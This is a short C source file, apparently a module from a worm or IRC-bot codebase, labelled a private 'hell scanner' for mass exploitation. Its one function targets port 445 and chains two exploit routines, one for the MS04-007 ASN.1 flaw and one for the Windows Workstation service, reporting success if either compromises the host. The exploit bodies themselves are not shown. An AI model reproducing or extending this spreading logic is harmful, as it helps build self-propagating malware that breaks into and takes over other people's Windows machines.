/*************************************************************
 *   Experiment code by Depth45. For educational use only!   *
 *       hell scanner - MASS SQL , MASS ASN, MASS WKS        *
 *                         PRIVATE                           *
 *************************************************************/


#include "includes.h"
#include "functions.h"
#include "externs.h"


#ifndef NO_DEPTH
#ifndef NO_DEPTH4
#ifndef NO_DEPTH6
#ifndef NO_MS04007ASN1

bool hell(EXINFO exinfo)
 {
	exinfo.port = 445;
	bool bMASSASN = massasn(exinfo);
	exinfo.port = 445;
	bool bR00T = wkssvc(exinfo);
	return bMASSASN || bR00T ? true : false;
}

#endif
#endif
#endif
#endif